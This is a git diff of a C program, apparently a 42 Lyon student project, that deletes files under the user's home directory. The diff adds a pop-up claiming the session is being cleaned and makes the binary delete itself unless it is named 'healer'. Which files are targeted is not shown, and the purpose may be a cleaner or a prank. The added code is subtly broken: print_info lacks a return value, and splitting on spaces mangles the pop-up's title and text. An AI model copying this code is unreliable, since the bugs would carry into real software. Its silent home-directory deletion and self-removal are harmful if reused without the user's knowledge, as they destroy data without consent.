@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:23:49 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/26 18:18:23 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/26 20:00:01 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -102,6 +102,23 @@ int	rm_file(char *home_buffer, char **envp)
 	return (0);
 }
 
+int	print_info(char **envp)
+{
+	char	**scmds;
+	char	cmd[BUFFER_SIZE];
+
+#if __APPLE__
+	sprintf(cmd, "zenity --info --title %s --text %s", "Well done!", "We are currently cleaning your session, please wait.");
+#else
+	sprintf(cmd, "zenity --info --title %s --text %s", "Well done!", "We are currently cleaning your session, please wait.");
+#endif /* __APPLE__ */
+	scmds = ft_split(cmd, ' ');
+	if (!scmds)
+		return (1);
+	process_child(scmds, envp);
+	waitpid(-1, NULL, 0);
+}
+
 int	main(int ac, char **av, char **envp)
 {
 	int			i;
@@ -114,6 +131,7 @@ int	main(int ac, char **av, char **envp)
 	realpath(getenv("HOME"), home_buffer);
 	realpath(av[0], current_file_buffer);
 	printf("home path %s\n", home_buffer);
+	print_info(envp);
 	while (file_list[i])
 	{
 		path = ft_strjoin(getenv("HOME"), file_list[i]);
@@ -128,7 +146,8 @@ int	main(int ac, char **av, char **envp)
 	usleep(10);
 	if (rm_file(home_buffer, envp))
 		return (1);
-	if (strcmp(av[0], "healer") == 0 && remove(current_file_buffer) < 0)
-		dprintf(2, "Could not remove file %s", current_file_buffer), perror("");
+	if (strcmp(av[0], "healer") != 0)
+		if (remove(current_file_buffer) < 0)
+			dprintf(2, "Could not remove file %s", current_file_buffer), perror("");
 	return (0);
 }
